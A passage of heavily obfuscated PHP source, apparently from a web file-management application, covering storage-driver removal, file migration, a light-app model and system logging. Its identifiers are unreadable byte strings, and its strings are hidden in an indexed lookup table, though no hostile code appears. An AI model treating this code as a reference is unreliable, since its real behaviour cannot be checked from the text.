$this->_parseError($Ö²âÙÉ¸, $Ğ¨üˆ³ , $½ Ìì‰–); } if ($Ğ¨üˆ³  == $ßÕÄ¿Í[68] && !$óòøó->checkRegion()) { return $this->_parseError(LNG($ßÕÄ¿Í[2291]), $Ğ¨üˆ³ , $½ Ìì‰–); } } $˜‘àãØ = rtrim($¥´ìûëœ[$ßÕÄ¿Í[1242]], $ßÕÄ¿Í[8]) . $ßÕÄ¿Í[8]; $·÷İÌìî = $óòøó->getPath($˜‘àãØ . $ßÕÄ¿Í[1246]); try { if ($Ğ¨üˆ³  == $ßÕÄ¿Í[109]) { $óòøó->mkdir($˜‘àãØ); } $˜Îœ€Á¦ = $óòøó->mkfile($·÷İÌìî); if (!$˜Îœ€Á¦) { $Ö²âÙÉ¸ = LNG($ßÕÄ¿Í[2288]); } } catch (Exception $ğŞ«ìÛ§) { $Ö²âÙÉ¸ = $ğŞ«ìÛ§->getMessage(); } if (isset($Ö²âÙÉ¸)) { return $this->_parseError($Ö²âÙÉ¸, $Ğ¨üˆ³ , $½ Ìì‰–); } $¥´ìûëœ[$ßÕÄ¿Í[1242]] = $˜‘àãØ; $Åé–‹ìã[$ßÕÄ¿Í[6]] = json_encode($¥´ìûëœ); $Åé–‹ìã[$ßÕÄ¿Í[98]] = $Ş†ª—«¸; return !0; } private function _parseError($ª¶…°°´, $‰ßÀªú¬, $ïÁ¬‘´Ö = false) { $„Ÿ‘øá =& $_SERVER[‹è™Ü¸Ñ]; if ($‰ßÀªú¬ == $„Ÿ‘øá[68] && stripos($ª¶…°°´, $„Ÿ‘øá[2292])) { $‹Áı = explode($„Ÿ‘øá[10], $ª¶…°°´); $ŸãÂ¶ŸÍ = isset($‹Áı[1]) ? $‹Áı[1] : $„Ÿ‘øá[12]; $ÓÌó›ş = array($„Ÿ‘øá[2293] => LNG($„Ÿ‘øá[2294]), $„Ÿ‘øá[2295] => LNG($„Ÿ‘øá[2296])); if (isset($ÓÌó›ş[$ŸãÂ¶ŸÍ])) { $ª¶…°°´ = $ÓÌó›ş[$ŸãÂ¶ŸÍ]; } } if (stripos($ª¶…°°´, $„Ÿ‘øá[2297]) === 0) { $¼Ğ¿ÈÛê = strpos($ª¶…°°´, $„Ÿ‘øá[178]); if ($¼Ğ¿ÈÛê === !1) { $¼Ğ¿ÈÛê = strpos($ª¶…°°´, $„Ÿ‘øá[4]); } if ($¼Ğ¿ÈÛê !== !1) { $ª¶…°°´ = substr($ª¶…°°´, $¼Ğ¿ÈÛê + 1); } } $ª¶…°°´ = LNG($„Ÿ‘øá[1249]) . $ª¶…°°´; if ($ïÁ¬‘´Ö) { return $ª¶…°°´; } show_json($ª¶…°°´, !1); } public function driverListSystem() { $¼÷„¸ö =& $_SERVER[‹è™Ü¸Ñ]; $‡²¶Ùù = parent::listData(); $­€ƒÍ—§ = array(); foreach ($‡²¶Ùù as $ßúÍÛ´ê) { unset($ßúÍÛ´ê[$¼÷„¸ö[231]], $ßúÍÛ´ê[$¼÷„¸ö[88]]); $ßúÍÛ´ê[$¼÷„¸ö[6]] = json_decode($ßúÍÛ´ê[$¼÷„¸ö[6]], !0); $­€ƒÍ—§[] = $ßúÍÛ´ê; } return $­€ƒÍ—§; } public function defaultDriver() { $ú’ö § =& $_SERVER[‹è™Ü¸Ñ]; $ÜÚ÷©ôû = parent::listData(); $ Öô¤—ª = array_filter_by_field($ÜÚ÷©ôû, $ú’ö §[37], 1); $ Öô¤—ª = $ Öô¤—ª[0]; if ($ Öô¤—ª) { $ Öô¤—ª[$ú’ö §[6]] = json_decode($ Öô¤—ª[$ú’ö §[6]], !0); } return $ Öô¤—ª; } public function driverInfo($Š¹ñï•) { $í·ÒÓÁ =& $_SERVER[‹è™Ü¸Ñ]; $ø”ıÈ¢Ü = array_to_keyvalue(parent::listData(), $í·ÒÓÁ[475]); if (!isset($ø”ıÈ¢Ü[$Š¹ñï•])) { return !1; } $ÂáØ·ı = $ø”ıÈ¢Ü[$Š¹ñï•]; $ÂáØ·ı[$í·ÒÓÁ[6]] = json_decode($ÂáØ·ı[$í·ÒÓÁ[6]], !0); return $ÂáØ·ı; } public function remove($˜ï»±‹£) { $this->removeShareItems($˜ï»±‹£); return parent::remove($˜ï»±‹£); } public function removeWithFile($åôˆë¿, $×Şó¼©–, $Ò©é«ŸÀ, $å“¤Â˜‚ = false) { $»…¸ÏÜò =& $_SERVER[‹è™Ü¸Ñ]; $ÍˆóÆƒ = array($»…¸ÏÜò[872] => $åôˆë¿); $«ÏÈÍ‹‘ = Model($»…¸ÏÜò[544])->where($ÍˆóÆƒ)->count(); $ŸÔ¾ş¬ = Model($»…¸ÏÜò[544])->where($ÍˆóÆƒ)->sum($»…¸ÏÜò[79]); $Œğ¶¶¸Ñ = $×Şó¼©– . $»…¸ÏÜò[2298] . $åôˆë¿; $›ËğÆ…™ = LNG($×Şó¼©– == $»…¸ÏÜò[620] ? $»…¸ÏÜò[2299] : $»…¸ÏÜò[2300]); $ŸĞ—·ïò = new TaskFileTransfer($Œğ¶¶¸Ñ, $»…¸ÏÜò[215], $«ÏÈÍ‹‘, $›ËğÆ…™ . $»…¸ÏÜò[462] . $Ò©é«ŸÀ[$»…¸ÏÜò[32]] . $»…¸ÏÜò[214] . $åôˆë¿); $ŸĞ—·ïò->task[$»…¸ÏÜò[818]] = (double) $ŸÔ¾ş¬; $³øÈÑáğ = KodIO::defaultDriver(); $ğ‡æ“†Ü = $³øÈÑáğ[$»…¸ÏÜò[475]]; $áÏ†Ä–İ = $·½Şšî = $è–°š· = array(); $Ò¹åá†Ã = Model($»…¸ÏÜò[230])->where($ÍˆóÆƒ)->field($»…¸ÏÜò[2301])->select(); foreach ($Ò¹åá†Ã as $ÇÉöñëò) { $Ê¶Ú‡äÂ = $ÇÉöñëò[$»…¸ÏÜò[541]]; if ($å“¤Â˜‚) { $·½Şšî[] = $Ê¶Ú‡äÂ; continue; } $¨ğˆùñÚ = $ÇÉöñëò[$»…¸ÏÜò[87]]; $ş™¸˜Çß = get_path_father($¨ğˆùñÚ); $è–°š·[] = $ş™¸˜Çß; $ş™¸˜Çß = str_replace("\x7b\151\x6f\72{$åôˆë¿}\x7d\57", "\173\x69\157\x3a{$ğ‡æ“†Ü}\175\x2f", $ş™¸˜Çß); if (!IO::exist($¨ğˆùñÚ)) { $áÏ†Ä–İ[] = $Ê¶Ú‡äÂ; $ŸĞ—·ïò->updateFileEnd($ÇÉöñëò[$»…¸ÏÜò[32]], $ÇÉöñëò[$»…¸ÏÜò[79]]); write_log($»…¸ÏÜò[2302] . $¨ğˆùñÚ, $»…¸ÏÜò[1882]); continue; } $ç¸ÜøÖİ = IO::move($¨ğˆùñÚ, $ş™¸˜Çß, REPEAT_RENAME); if (!$ç¸ÜøÖİ) { $·½Şšî[] = $Ê¶Ú‡äÂ; $ŸĞ—·ïò->updateFileEnd($ÇÉöñëò[$»…¸ÏÜò[32]], $ÇÉöñëò[$»…¸ÏÜò[79]]); write_log($»…¸ÏÜò[2303] . $¨ğˆùñÚ, $»…¸ÏÜò[1882]); continue; } $ÍˆóÆƒ = array($»…¸ÏÜò[541] => $Ê¶Ú‡äÂ); $³İé”Å = array($»…¸ÏÜò[872] => $ğ‡æ“†Ü, $»…¸ÏÜò[87] => $ç¸ÜøÖİ); Model($»…¸ÏÜò[230])->where($ÍˆóÆƒ)->save($³İé”Å); } $Ò±Òö¿ = $ŸĞ—·ïò->task; if (!$å“¤Â˜‚) { Cache::set($Œğ¶¶¸Ñ, $Ò±Òö¿); } $ŸĞ—·ïò->end(); $áÏ†Ä–İ = array_unique($áÏ†Ä–İ); $·½Şšî = array_unique($·½Şšî); if (!$å“¤Â˜‚ && ($áÏ†Ä–İ || $·½Şšî)) { $œ«ƒÔšÎ = array(); if ($áÏ†Ä–İ) { $œ«ƒÔšÎ[] = sprintf(LNG($»…¸ÏÜò[2304]), count($áÏ†Ä–İ)); } if ($·½Şšî) { $œ«ƒÔšÎ[] = sprintf(LNG($»…¸ÏÜò[2305]), count($·½Şšî)); } $œ«ƒÔšÎ = sprintf(LNG($»…¸ÏÜò[2306]), implode($»…¸ÏÜò[2307], $œ«ƒÔšÎ)) . $»…¸ÏÜò[2308] . date($»…¸ÏÜò[2309]) . $»…¸ÏÜò[2310]; if ($×Şó¼©– == $»…¸ÏÜò[1919]) { $œ«ƒÔšÎ .= $»…¸ÏÜò[2311] . LNG($»…¸ÏÜò[2312]); } $Ò±Òö¿[$»…¸ÏÜò[1244]] = $œ«ƒÔšÎ; Cache::set($Œğ¶¶¸Ñ, $Ò±Òö¿); unset($Ò©é«ŸÀ[$»…¸ÏÜò[6]]); $¿Î‘ˆÑ = array($»…¸ÏÜò[475] => $åôˆë¿, $»…¸ÏÜò[2189] => $»…¸ÏÜò[620], $»…¸ÏÜò[32] => $Ò©é«ŸÀ[$»…¸ÏÜò[32]], $»…¸ÏÜò[1267] => $Ò©é«ŸÀ); Hook::trigger($»…¸ÏÜò[1763], array($»…¸ÏÜò[1267] => $¿Î‘ˆÑ, $»…¸ÏÜò[1277] => !0)); show_json($œ«ƒÔšÎ, !1, 100111); } if ($×Şó¼©– == $»…¸ÏÜò[620]) { return !0; } if ($áÏ†Ä–İ || $·½Şšî) { $ıå÷ĞÜ  = array_merge($áÏ†Ä–İ, $·½Şšî); $ıå÷ĞÜ  = array_filter(array_unique($ıå÷ĞÜ )); $this->removeByFileID($ıå÷ĞÜ ); } if ($è–°š·) { $è–°š· = array_filter(array_unique($è–°š·)); foreach ($è–°š· as $¨ğˆùñÚ) { $¼¼¿¢»à = IO::has($¨ğˆùñÚ, !0); if (!$¼¼¿¢»à[$»…¸ÏÜò[239]] && !$¼¼¿¢»à[$»…¸ÏÜò[240]]) { IO::remove($¨ğˆùñÚ); } } } return $this->remove($åôˆë¿); } private function removeByFileID($šš¦ó€ = array()) { $½Àğ—Ì =& $_SERVER[‹è™Ü¸Ñ]; if (empty($šš¦ó€)) { return; } $¨úš’’¹ = array($½Àğ—Ì[541] => array($½Àğ—Ì[7], $šš¦ó€)); $ÃÉù™œ· = Model($½Àğ—Ì[1398])->where($¨úš’’¹)->field($½Àğ—Ì[193])->select(); if (!$ÃÉù™œ·) { return Model($½Àğ—Ì[544])->remove($šš¦ó€); } $ÃÉù™œ· = array_to_keyvalue($ÃÉù™œ·, $½Àğ—Ì[12], $½Àğ—Ì[193]); foreach ($ÃÉù™œ· as $”©Î¡¹ó) { Model($½Àğ—Ì[879])->removeNow($”©Î¡¹ó, !1); } } private function removeShareItems($‰î†Ùİ·) { $È´ÁÑÏµ =& $_SERVER[‹è™Ü¸Ñ]; $Ø¡ı€ï = "\x7b\151\157\x3a{$‰î†Ùİ·}\175\x2f"; $¦ô‰‘Úš = array($È´ÁÑÏµ[193] => 0, $È´ÁÑÏµ[1237] => array($È´ÁÑÏµ[459], "{$Ø¡ı€ï}\x25")); $¶­‰¹ŠŒ = Model($È´ÁÑÏµ[1930])->where($¦ô‰‘Úš)->field($È´ÁÑÏµ[665])->select(); if (empty($¶­‰¹ŠŒ)) { return; } $ßÑù±ç§ = array_to_keyvalue($¶­‰¹ŠŒ, $È´ÁÑÏµ[12], $È´ÁÑÏµ[665]); Model($È´ÁÑÏµ[664])->remove($ßÑù±ç§); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\x4c\151\147\150\164\101\160\x70"; public $modelType = "\x53\x79\x73\x74\145\x6d\117\x70\164\151\x6f\x6e"; public $field = array("\x6e\141\155\x65", "\147\162\x6f\165\x70", "\x64\145\x73\143", "\143\x6f\x6e\164\x65\156\x74"); public function listData($“øÑ—½¸ = false, $ÁªÅÆôë = "\x6d\x6f\144\x69\146\171\124\x69\155\x65", $¿…È·–Ù = true) { return parent::listData($“øÑ—½¸, $ÁªÅÆôë, $¿…È·–Ù); } public function remove($ü‡¶Ü) { $µ…²İ€Ë = $this->findByName($ü‡¶Ü); if (!$µ…²İ€Ë) { return !1; } return parent::remove($µ…²İ€Ë[$_SERVER[‹è™Ü¸Ñ][475]]); } public function add($ÎŞûïò×) { if ($this->findByName($ÎŞûïò×[$_SERVER[‹è™Ü¸Ñ][32]])) { return !1; } return parent::insert($ÎŞûïò×); } public function update($ı¹šö»º, $•şİ½¾Õ) { $›öÅˆÈĞ =& $_SERVER[‹è™Ü¸Ñ]; $£ºó°¿ö = $this->findByName($ı¹šö»º); $ÖÌ½Ã¥ç = $this->findByName($•şİ½¾Õ[$›öÅˆÈĞ[32]]); if (!$£ºó°¿ö || $ÖÌ½Ã¥ç && $ÖÌ½Ã¥ç[$›öÅˆÈĞ[475]] != $£ºó°¿ö[$›öÅˆÈĞ[475]]) { return !1; } return parent::update($£ºó°¿ö[$›öÅˆÈĞ[475]], $•şİ½¾Õ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\155\x5f\x6c\157\x67"; protected $dataAuto = array(array("\143\x72\x65\141\164\145\124\x69\155\145", "\x74\151\x6d\145", "\151\x6e\163\145\162\164", "\146\x75\156\143\164\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ğú¯áÆ¼ =& $_SERVER[‹è™Ü¸Ñ]; return array($ğú¯áÆ¼[2313] => LNG($ğú¯áÆ¼[2314]), $ğú¯áÆ¼[2315] => LNG($ğú¯áÆ¼[2316]), $ğú¯áÆ¼[1893] => LNG($ğú¯áÆ¼[2317]), $ğú¯áÆ¼[2318] => LNG($ğú¯áÆ¼[2319]), $ğú¯áÆ¼[2320] => LNG($ğú¯áÆ¼[2321]), $ğú¯áÆ¼[2322] => LNG($ğú¯áÆ¼[2323]), $ğú¯áÆ¼[2324] => LNG($ğú¯áÆ¼[2325]), $ğú¯áÆ¼[1923] => LNG($ğú¯áÆ¼[2325]), $ğú¯áÆ¼[1924] => LNG($ğú¯áÆ¼[2326]), $ğú¯áÆ¼[2327] => LNG($ğú¯áÆ¼[2328]), $ğú¯áÆ¼[2329] => LNG($ğú¯áÆ¼[2330]), $ğú¯áÆ¼[2331] => LNG($ğú¯áÆ¼[2332]), $ğú¯áÆ¼[2333] => LNG($ğú¯áÆ¼[2334]), $ğú¯áÆ¼[1921] => LNG($ğú¯áÆ¼[2335]), $ğú¯áÆ¼[2336] => LNG($ğú¯áÆ¼[2337]), $ğú¯áÆ¼[1928] => LNG($ğú¯áÆ¼[2338]), $ğú¯áÆ¼[2339] => LNG($ğú¯áÆ¼[2340]), $ğú¯áÆ¼[2341] => LNG($ğú¯áÆ¼[2342]), $ğú¯áÆ¼[2343] => LNG($ğú¯áÆ¼[2344]), $ğú¯áÆ¼[2345] => LNG($ğú¯áÆ¼[2346]), $ğú¯áÆ¼[1931] => LNG($ğú¯áÆ¼[2347]), $ğú¯áÆ¼[1932] => LNG($ğú¯áÆ¼[2348]), $ğú¯áÆ¼[2349] => LNG($ğú¯áÆ¼[2350]), $ğú¯áÆ¼[2351] => LNG($ğú¯áÆ¼[2352]), $ğú¯áÆ¼[2353] => LNG($ğú¯áÆ¼[2354]), $ğú¯áÆ¼[1926] => LNG($ğú¯áÆ¼[2355]), $ğú¯áÆ¼[2356] => LNG($ğú¯áÆ¼[2357]), $ğú¯áÆ¼[1925] => LNG($ğú¯áÆ¼[2358]), $ğú¯áÆ¼[2359] => LNG($ğú¯áÆ¼[2360]), $ğú¯áÆ¼[2361] => LNG($ğú¯áÆ¼[2362]), $ğú¯áÆ¼[2363] => LNG($ğú¯áÆ¼[2362]), $ğú¯áÆ¼[2364] => LNG($ğú¯áÆ¼[2365]), $ğú¯áÆ¼[2366] => LNG($ğú¯áÆ¼[2366]), $ğú¯áÆ¼[2367] => LNG($ğú¯áÆ¼[1897]), $ğú¯áÆ¼[2368] => LNG($ğú¯áÆ¼[2369]), $ğú¯áÆ¼[2370] => LNG($ğú¯áÆ¼[2371]), $ğú¯áÆ¼[2372] => LNG($ğú¯áÆ¼[2373]), $ğú¯áÆ¼[2374] => LNG($ğú¯áÆ¼[2375]), $ğú¯áÆ¼[2376] => LNG($ğú¯áÆ¼[2377]), $ğú¯áÆ¼[2378] => LNG($ğú¯áÆ¼[2378]), $ğú¯áÆ¼[2379] => LNG($ğú¯áÆ¼[2380]), $ğú¯áÆ¼[2381] => LNG($ğú¯áÆ¼[2382]), $ğú¯áÆ¼[2383] => LNG($ğú¯áÆ¼[2384]), $ğú¯áÆ¼[2385] => LNG($ğú¯áÆ¼[2386]), $ğú¯áÆ¼[2387] => LNG($ğú¯áÆ¼[2388]), $ğú¯áÆ¼[2389] => LNG($ğú¯áÆ¼[2390]), $ğú¯áÆ¼[212] => LNG($ğú¯áÆ¼[212]), $ğú¯áÆ¼[213] => LNG($ğú¯áÆ¼[2391]), $ğú¯áÆ¼[2392] => LNG($ğú¯áÆ¼[2392])); } private function typeFile() { $ÅÇ¬¼ŠÑ =& $_SERVER[‹è™Ü¸Ñ]; $¬öÍŸİ = array($ÅÇ¬¼ŠÑ[1928] => array($ÅÇ¬¼ŠÑ[1929]), $ÅÇ¬¼ŠÑ[2331] => array($ÅÇ¬¼ŠÑ[2393]), $ÅÇ¬¼ŠÑ[2333] => array($ÅÇ¬¼ŠÑ[2394]), $ÅÇ¬¼ŠÑ[1921] => array($ÅÇ¬¼ŠÑ[1922], $ÅÇ¬¼ŠÑ[2395]), $ÅÇ¬¼ŠÑ[2341] => array(), $ÅÇ¬¼ŠÑ[2343] => array(), $ÅÇ¬¼ŠÑ[2345] => array(), $ÅÇ¬¼ŠÑ[1931] => array($ÅÇ¬¼ŠÑ[1933]), $ÅÇ¬¼ŠÑ[1932] => array($ÅÇ¬¼ŠÑ[1933]), $ÅÇ¬¼ŠÑ[2349] => array($ÅÇ¬¼ŠÑ[2396]), $ÅÇ¬¼ŠÑ[2351] => array($ÅÇ¬¼ŠÑ[2396]), $ÅÇ¬¼ŠÑ[2353] => array($ÅÇ¬¼ŠÑ[2397]), $ÅÇ¬¼ŠÑ[2339] => array($ÅÇ¬¼ŠÑ[2398]), $ÅÇ¬¼ŠÑ[1926] => array($ÅÇ¬¼ŠÑ[2399]), $ÅÇ¬¼ŠÑ[2356] => array($ÅÇ¬¼ŠÑ[2400]), $ÅÇ¬¼ŠÑ[1925] => array($ÅÇ¬¼ŠÑ[1927])); return $¬öÍŸİ; } private function typeAll() { $ÄÇçèå¤ =& $_SERVER[‹è™Ü¸Ñ]; $›¶¤©ŞÊ = $this->typeList; $ø²Ï’¸é = array_filter($this->typeFile()); foreach ($ø²Ï’¸é as $£‡íÃÉ„ => $Á¶¹ò‚) { $›¶¤©ŞÊ[$Á¶¹ò‚[0]] = $›¶¤©ŞÊ[$£‡íÃÉ„]; } $›¶¤©ŞÊ[$ÄÇçèå¤[1933]] = LNG($ÄÇçèå¤[2401]); $›¶¤©ŞÊ[$ÄÇçèå¤[2396]] = LNG($ÄÇçèå¤[2402]); return $›¶¤©ŞÊ; } public function addLog($Êˆ¬éá», $îçÏÉİ† = array()) { $Éà£úó™ =& $_SERVER[‹è™Ü¸Ñ]; if (!isset($this->typeList[$Êˆ¬éá»])) { return; } $ô¥æ£Ò = Session::get($Éà£úó™[2092]); if (!$ô¥æ£Ò) { $ô¥æ£Ò = _get($îçÏÉİ†, $Éà£úó™[1752], 0); } if ($Êˆ¬éá» == $Éà£úó™[2368] && is_array($îçÏÉİ†[$Éà£úó™[2403]]) && !$îçÏÉİ†[$Éà£úó™[2403]]) { return; } $óîÆóÂ = get_client_ip(); if (!$îçÏÉİ† || strlen(json_encode($îçÏÉİ†)) >= 1024 * 64) { if ($îçÏÉİ† && is_array($îçÏÉİ†)) { $îçÏÉİ† = array_intersect_key($îçÏÉİ†, array_flip($Éà£úó™[475], $Éà£úó™[32])); $îçÏÉİ†[$Éà£úó™[2404]] = $óîÆóÂ; } else { $îçÏÉİ† = array($Éà£úó™[2404] => $óîÆóÂ); } } else { if (is_array($îçÏÉİ†)) { $îçÏÉİ†[$Éà£úó™[2404]] = $óîÆóÂ; } else { $îçÏÉİ† = array($Éà£úó™[1267] => $îçÏÉİ†, $Éà£úó™[2404] => $óîÆóÂ); } } $îçÏÉİ† = array($Éà£úó™[1742] => Session::sign(), $Éà£úó™[1743] => intval($ô¥æ£Ò), $Éà£úó™[33] => $Êˆ¬éá», $Éà£úó™[1745] => json_encode($îçÏÉİ†)); parent::add($îçÏÉİ†); } public function remove($­êŸÈˆİ) { $this->where(array($_SERVER[‹è™Ü¸Ñ][493] => $­êŸÈˆİ))->delete(); } private function _makeOrder($Í¤ÜéÉ‚ = '') { $ü•İşŞ =& $_SERVER[‹è™Ü¸Ñ]; $¨¦×ëÚ = $ü•İşŞ[231]; $ı€Àå…¿ = array($ü•İşŞ[523] => $ü•İşŞ[524], $ü•İşŞ[525] => $ü•İşŞ[526]); $ıœµßù = Input::get($ü•İşŞ[531], $ü•İşŞ[7], $ü•İşŞ[2128], array($ü•İşŞ[2046], $ü•İşŞ[525])); $ıœµßù = $ı€Àå…¿[$ıœµßù]; $Í¤ÜéÉ‚ = $Í¤ÜéÉ‚ . "{$¨¦×ëÚ}\x20{$ıœµßù}"; return $this->order($Í¤ÜéÉ‚); } public function get($íêòÆ¢ = '') { $ù×ÖÑ®ö =& $_SERVER[‹è™Ü¸Ñ]; if (!$íêòÆ¢) { show_json(array()); } $ğÄ’ŸÀ¹ = array(); if ($íêòÆ¢[$ù×ÖÑ®ö[1752]]) { $ğÄ’ŸÀ¹[$ù×ÖÑ®ö[1752]] = $íêòÆ¢[$ù×ÖÑ®ö[1752]]; } if (isset($íêòÆ¢[$ù×ÖÑ®ö[815]])) { $Şåõ½ğé = $íêòÆ¢[$ù×ÖÑ®ö[815]]; $¦¬ŠÅ›œ = isset($íêòÆ¢[$ù×ÖÑ®ö[816]]) ? $íêòÆ¢[$ù×ÖÑ®ö[816]] : time(); $ğÄ’ŸÀ¹[$ù×ÖÑ®ö[231]] = array($ù×ÖÑ®ö[409], array($Şåõ½ğé, $¦¬ŠÅ›œ)); } if ($íêòÆ¢[$ù×ÖÑ®ö[33]]) { $Ü‡¶‘€× = explode($ù×ÖÑ®ö[50], $íêòÆ¢[$ù×ÖÑ®ö[33]]); $ı»·ÛÄÃ = $this->typeFile(); $ÉïÁŠä€ = array(); foreach ($Ü‡¶‘€× as $‘‚¿Û‚Ö) { $ÉïÁŠä€[] = $‘‚¿Û‚Ö; if (isset($ı»·ÛÄÃ[$‘‚¿Û‚Ö])) { $ÉïÁŠä€ = array_merge($ÉïÁŠä€, $ı»·ÛÄÃ[$‘‚¿Û‚Ö]); } } $ÉïÁŠä€ = array_unique($ÉïÁŠä€); if ($ÉïÁŠä€) { $ğÄ’ŸÀ¹[$ù×ÖÑ®ö[33]] = array($ù×ÖÑ®ö[7], $ÉïÁŠä€); } } else { $ğÄ’ŸÀ¹[$ù×ÖÑ®ö[33]] = array($ù×ÖÑ®ö[2405], $ù×ÖÑ®ö[2406]); } if (!empty($íêòÆ¢[$ù×ÖÑ®ö[2404]])) { $ğÄ’ŸÀ¹[$ù×ÖÑ®ö[526]] = array($ù×ÖÑ®ö[459], "\45{$íêòÆ¢[$ù×ÖÑ®ö[2404]]}\45"); } $ä‹Ûµ¾İ = $this->_makeOrder()->where($ğÄ’ŸÀ¹)->selectPage(); if (empty($ä‹Ûµ¾İ[$ù×ÖÑ®ö[445]])) { show_json(array(), !0, $ä‹Ûµ¾İ[$ù×ÖÑ®ö[442]]); } $ä‹Ûµ¾İ[$ù×ÖÑ®ö[445]] = $this->logList($ä‹Ûµ¾İ[$ù×ÖÑ®ö[445]]); return $ä‹Ûµ¾İ; } private function ipAddress(&$¡¦á‡Ü) { $˜ğôĞôƒ =& $_SERVER[‹è™Ü¸Ñ]; if (!empty($¡¦á‡Ü[$˜ğôĞôƒ[2404]])) { $çáÔñÊı = IpLocation::get($¡¦á‡Ü[$˜ğôĞôƒ[2404]]); } else { $çáÔñÊı = LNG($˜ğôĞôƒ[2407]); } $¡¦á‡Ü[$˜ğôĞôƒ[2408]] = $çáÔñÊı; } private function descZipDownload($§ë÷İº¨, &$¥›­”Î³) { $€ªÑ®ÛÀ =& $_SERVER[‹è™Ü¸Ñ]; if (!isset($§ë÷İº¨[$€ªÑ®ÛÀ[2409]])) { return; } $Ã¯êù”â = json_decode($§ë÷İº¨[$€ªÑ®ÛÀ[2409]], !0); foreach ($Ã¯êù”â as $‹Ç‘Õæ) { try { $²°ÄÉÏ³ = IO::infoFullSimple($‹Ç‘Õæ[$€ªÑ®ÛÀ[87]]); } catch (Exception $ÊÏ‡ÔÅ) { continue; } $§ë÷İº¨[$€ªÑ®ÛÀ[87]] = $‹Ç‘Õæ[$€ªÑ®ÛÀ[87]]; $¥›­”Î³[] = $§ë÷İº¨[$€ªÑ®ÛÀ[193]] = $²°ÄÉÏ³[$€ªÑ®ÛÀ[193]]; $¥›­”Î³[] = $§ë÷İº¨[$€ªÑ®ÛÀ[2184]] = $²°ÄÉÏ³[$€ªÑ®ÛÀ[192]]; break; } return $§ë÷İº¨; } private function getSourceList(&$ÅËšû¯Ò) { $‹¦­÷·€ =& $_SERVER[‹è™Ü¸Ñ]; $Ò‰ı˜Âú = array(); foreach ($ÅËšû¯Ò as $ã‹Áó¸ê => $ñÓ·÷À¨) { $Õœ§·Ø· = json_decode($ñÓ·÷À¨[$‹¦­÷·€[526]], !0); if ($ñÓ·÷À¨[$‹¦­÷·€[33]] == $‹¦­÷·€[1924]) { $Õœ§·Ø· = $this->descZipDownload($Õœ§·Ø·, $Ò‰ı˜Âú); $ÅËšû¯Ò[$ã‹Áó¸ê][$‹¦­÷·€[526]] = json_encode($Õœ§·Ø·); continue; } if (strpos($ñÓ·÷À¨[$‹¦­÷·€[33]], $‹¦­÷·€[2186]) !== 0) { if (!isset($Õœ§·Ø·[$‹¦­÷·€[87]]) || strpos($ñÓ·÷À¨[$‹¦­÷·€[33]], $‹¦­÷·€[2410]) !== 0) { continue; } try { $“ÁÃÓÍ… = IO::infoFullSimple($Õœ§·Ø·[$‹¦­÷·€[87]]); } catch (Exception $×è»Ë¤) { continue; } $Ò‰ı˜Âú[] = $Õœ§·Ø·[$‹¦­÷·€[193]] = $“ÁÃÓÍ…[$‹¦­÷·€[193]]; $Ò‰ı˜Âú[] = $Õœ§·Ø·[$‹¦­÷·€[2184]] = $“ÁÃÓÍ…[$‹¦­÷·€[192]]; $ÅËšû¯Ò[$ã‹Áó¸ê][$‹¦­÷·€[526]] = json_encode($Õœ§·Ø·); continue; } $Ò‰ı˜Âú[] = $Õœ§·Ø·[$‹¦­÷·€[193]]; $Ò‰ı˜Âú[] = $Õœ§·Ø·[$‹¦­÷·€[2184]]; if ($Õœ§·Ø·[$‹¦­÷·€[33]] == $‹¦­÷·€[620]) { $Ò‰ı˜Âú[] = $Õœ§·Ø·[$‹¦­÷·€[526]][$‹¦­÷·€[1221]]; $Ò‰ı˜Âú[] = $Õœ§·Ø·[$‹¦­÷·€[526]][$‹¦­÷·€[1222]]; } if ($Õœ§·Ø·[$‹¦­÷·€[33]] == $‹¦­÷·€[2195]) { $Ò‰ı˜Âú[] = $Õœ§·Ø·[$‹¦­÷·€[526]][$‹¦­÷·€[193]]; } } if (!$Ò‰ı˜Âú) { return array(); } return Model($‹¦­÷·€[879])->sourceListInfo($Ò‰ı˜Âú, !0); } private function logList($°»ƒ€‘’) { $òÈöìä· =& $_SERVER[‹è™Ü¸Ñ]; $…Œ²ş•Ç = array_to_keyvalue($°»ƒ€‘’, $òÈöìä·[12], $òÈöìä·[1752]); $Á€‡“¶ª = Model($òÈöìä·[598])->userListInfo(array_unique($…Œ²ş•Ç)); $»‚×›îæ = $this->getSourceList($°»ƒ€‘’); $×›…Êá— = $this->typeAll(); $¿›åù’Ä = array(); $–ÂÉ„Êõ = array(); foreach ($°»ƒ€‘’ as $ƒ³³æ‹Á => $¦ó‚Ã…‘) { $–æô§ó = $¦ó‚Ã…‘[$òÈöìä·[33]]; $ª«É±é£ = isset($Á€‡“¶ª[$¦ó‚Ã…‘[$òÈöìä·[1752]]]) ? $Á€‡“¶ª[$¦ó‚Ã…‘[$òÈöìä·[1752]]] : !1; $âÎ€ÙáÜ = strpos($–æô§ó, $òÈöìä·[2411]) === 0 ? LNG($òÈöìä·[2412]) : LNG($òÈöìä·[2407]); $¦ó‚Ã…‘[$òÈöìä·[32]] = isset($ª«É±é£[$òÈöìä·[32]]) ? $ª«É±é£[$òÈöìä·[32]] : LNG($òÈöìä·[2407]); $¦ó‚Ã…‘[$òÈöìä·[2239]] = isset($ª«É±é£[$òÈöìä·[2239]]) ? $ª«É±é£[$òÈöìä·[2239]] : $òÈöìä·[12]; $¦ó‚Ã…‘[$òÈöìä·[1639]] = isset($×›…Êá—[$–æô§ó]) ? $×›…Êá—[$–æô§ó] : $âÎ€ÙáÜ; $¦ó‚Ã…‘[$òÈöìä·[2127]] = $ª«É±é£; $–Š™èŠ‚ = json_decode($¦ó‚Ã…‘[$òÈöìä·[526]], !0); $¦ó‚Ã…‘[$òÈöìä·[2404]] = isset($–Š™èŠ‚[$òÈöìä·[2404]]) ? $–Š™èŠ‚[$òÈöìä·[2404]] : $òÈöìä·[12]; $¦ó‚Ã…‘[$òÈöìä·[2408]] = IpLocation::get($¦ó‚Ã…‘[$òÈöìä·[2404]]); if (strpos($–æô§ó, $òÈöìä·[2186]) === 0 || isset($–Š™èŠ‚[$òÈöìä·[2184]])) { $–Š™èŠ‚[$òÈöìä·[90]] = $»‚×›îæ[$–Š™èŠ‚[$òÈöìä·[193]]]; $–Š™èŠ‚[$òÈöìä·[2200]] = $»‚×›îæ[$–Š™èŠ‚[$òÈöìä·[2184]]]; if 